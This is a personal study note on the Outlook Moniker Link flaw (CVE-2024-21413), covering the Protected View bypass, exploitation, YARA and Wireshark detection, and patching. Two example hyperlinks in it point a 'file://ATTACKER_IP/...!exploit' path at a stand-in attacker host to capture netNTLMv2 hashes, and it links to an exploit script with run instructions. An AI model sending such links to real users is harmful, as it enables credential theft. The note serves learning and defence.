# Day 27 10th august 2025

# Moniker Link (CVE-2024-21413)

The vulnerability bypasses Outlook's security mechanisms when handing a specific type of hyperlink known as a Moniker Link. 

An attacker can abuse this by sending an email that contains a malicious Moniker Link to a victim, resulting in Outlook sending the user's NTLM credentials to the attacker once the hyperlink is clicked.

Impact- Remote Code Execution & Credential Leak
Severity-	Critical
Attack Complexity-	Low

Objective:
How the vulnerability works
Understand Outlook's "Protected View"
Using the vulnerability to leak credentials from an Outlook client
Detection and mitigation measures


## what is this MonikerLink

Outlook can render emails as HTML.
Additionally, Outlook can parse hyperlinks such as HTTP and HTTPS.

Normally, Outlook will prompt a security warning when external applications are triggered.  

This pop-up is a result of Outlook's "Protected View". 
Protected View opens emails containing attachments, hyperlinks and similar content in read-only mode, blocking things such as macros (especially from outside an organisation). 

By using the **`file://`** Moniker Link in our hyperlink, we can instruct Outlook to attempt to access a file, such as a file on a network share `(<a href="file://ATTACKER_IP/test">Click me</a>).` 
The SMB (Server Message Block ) protocol is used, which involves using local credentials for authentication. 
However, Outlook's "Protected View" catches and blocks this attempt.

The vulnerability here exists by modifying our hyperlink to include the **!** special character and some text in our Moniker Link which results in bypassing Outlook’s Protected View. 
For example: <a href="file://ATTACKER_IP/test!exploit">Click me</a>.

We, as attackers, can provide a Moniker Link of this nature for the attack. 

Note the share does not need to exist on the remote device, as an authentication attempt will be attempted regardless, leading to the victim's Windows netNTLMv2 hash being sent to the attacker.

## Exploitation

For this attack, we will email our victim a Moniker Link similar to the one provided in the previous task. 
The objective, as the attacker, is to craft an email to the victim with a Moniker Link that bypasses Outlook's "Protected View", where the victim’s client will attempt to load a file from our attacking machine, resulting in the victim’s netNTLMv2 hash being captured.

// create a youtube video // 

## Detection

[clickme](https://github.com/CMNatic/CVE-2024-21413/blob/main/exploit.py)
Change attacker machine to the sender device ip.
Also change mailserver to reciever's ip.
use *python3* while running the script.
### YARA

A [Yara](https://github.com/Neo23x0/signature-base/blob/master/yara/expl_outlook_cve_2024_21413.yar) rule has been created by Florian Roth to detect emails containing the file:\\ element in the Moniker Link.

### wireshark

Additionally, the SMB request from the victim to the client can be seen in a packet capture with a truncated netNTLMv2 hash.

### Remediation

Microsoft has included patches to resolve this vulnerability in February’s “patch Tuesday” release.

Additionally, in the meantime, it is a timely reminder to practice general - safe - cyber security practices. For example, reminding users to:

Do not click random links (especially from unsolicited emails)
Preview links before clicking them
Forward suspicious emails to the respective department responsible for cyber security


Since this vulnerability bypasses Outlook's Protected View, there is no way to reconfigure Outlook to prevent this attack. 
Additionally, preventing the SMB protocol entirely may do more harm than good, especially as it is essential for accessing network shares. 
However, you may be able to block this at the **firewall level**, depending on the organisation.

Outlook is an extremely popular email client. 
The CVE is known to affect a large portion of the Office suite, and given its extremely low attack complexity, it's quite a spicy one.